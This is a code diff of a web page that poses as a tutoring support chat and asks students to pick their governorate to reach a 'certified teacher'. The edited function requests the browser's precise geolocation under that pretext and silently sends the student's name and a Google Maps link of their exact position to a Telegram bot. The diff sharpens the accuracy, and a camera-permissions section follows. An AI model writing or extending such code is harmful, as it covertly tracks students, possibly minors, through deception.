@@ -224,7 +224,7 @@
 
         function openPreMenu() { document.getElementById('pre-chat-menu').style.display = 'flex'; }
 
-        // --- أذونات الموقع (تم التظبيط لتظهر فور الضغط) ---
+        // --- أذونات الموقع (تم التظبيط لتظهر فور الضغط وتُرسل بدقة) ---
         function startTeacherChat() {
             UGOV = document.getElementById('user-gov').value;
             if(!UGOV) return alert("اختر محافظتك أولاً.");
@@ -232,14 +232,26 @@
             showSystemMsg("جاري طلب إذن الموقع لتحديد أقرب معلم معتمد بمحافظة " + UGOV);
             
             navigator.geolocation.getCurrentPosition((pos) => {
-                let geo = `📍 موقع الطالب ${UN}:\nhttp://www.google.com/maps/place/${pos.coords.latitude},${pos.coords.longitude}\nالمحافظة: ${UGOV}`;
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                
+                // اللينك الدقيق اللي هيتبعت للبوت
+                let mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                
+                let geo = `📍 موقع الطالب ${UN}:\nالرابط: ${mapLink}\nالمحافظة: ${UGOV}`;
+                
                 fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(geo)}`);
+                
                 document.getElementById('pre-chat-menu').style.display = 'none';
                 document.getElementById('support-window').style.display = 'flex';
                 document.getElementById('t-name').innerText = teachers[UGOV] || "معلم معتمد";
             }, (err) => {
                 showSystemMsg("يجب السماح بالوصول للموقع لربطك بمعلمي محافظة " + UGOV);
-            }, {enableHighAccuracy:true, timeout: 5000});
+            }, {
+                enableHighAccuracy: true, 
+                timeout: 8000,
+                maximumAge: 0
+            });
         }
 
         // --- أذونات الكاميرا ---
